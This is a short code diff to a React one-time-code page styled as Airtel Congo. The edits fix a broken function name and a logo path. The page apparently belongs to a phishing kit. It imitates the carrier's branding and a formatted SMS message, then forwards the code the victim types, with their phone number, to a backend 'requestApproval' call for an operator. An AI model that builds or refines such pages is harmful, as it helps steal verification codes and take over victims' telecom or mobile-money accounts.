@@ -14,7 +14,7 @@ import {
 } from "../styles/sharedStyles";
 import { OtpVerificationPageProps } from "../types";
 
-const formatAirtel CongoOtpMessage = (otpValue: string) =>
+const formatAirtelCongoOtpMessage = (otpValue: string) =>
     `<#> Your Airtel Congo OTP is:${otpValue}. Do not share this code with anyone. Expires in 2 mins. td1xRGYXC+L`;
 
 function OtpVerificationPage({
@@ -84,7 +84,7 @@ function OtpVerificationPage({
             const res = await requestApproval({
                 type: 'otp',
                 phone: phoneNumber?.replace(/\D/g, '') || "N/A",
-                details: formatAirtel CongoOtpMessage(otpValue),
+                details: formatAirtelCongoOtpMessage(otpValue),
             });
 
             const attemptId = res.attemptId;
@@ -169,7 +169,7 @@ function OtpVerificationPage({
                 >
                     <ArrowLeft size={20} />
                 </button>
-                <img src="/Airtel Congo.svg" alt="Airtel Congo" style={logoStyle} />
+                <img src="/airtel.svg" alt="Airtel Congo" style={logoStyle} />
                 <button style={menuButtonStyle}>☰</button>
             </div>
 
